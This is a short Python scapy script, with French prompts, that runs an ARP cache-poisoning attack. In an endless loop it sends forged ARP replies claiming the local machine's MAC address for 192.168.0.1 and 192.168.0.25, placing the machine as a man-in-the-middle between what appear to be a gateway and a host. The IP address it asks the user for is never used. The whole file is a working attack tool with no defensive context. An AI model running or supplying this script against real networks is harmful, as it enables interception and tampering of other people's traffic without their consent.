from scapy.all import *

def sendpacket(isrc,hsrc,ipdst,hdst):
	time.sleep(0.1)
	coruptedREP =  ARP(op=2, psrc=isrc, hwsrc=hsrc,pdst=ipdst,hwdst=hdst)
	sr(coruptedREP,retry=1,timeout=2,verbose=False)


myMacAdress=Ether().src
ipToSpoof=input("Adresse ip a spoofer:\n")

print("adress a spoofer : "+ipToSpoof+" mac address: "+myMacAdress)
while True:
	sendpacket("192.168.0.1",myMacAdress,"192.168.0.25","00:00:00:00:00:00")
	sendpacket("192.168.0.25",myMacAdress,"192.168.0.1","00:00:00:00:00:00")

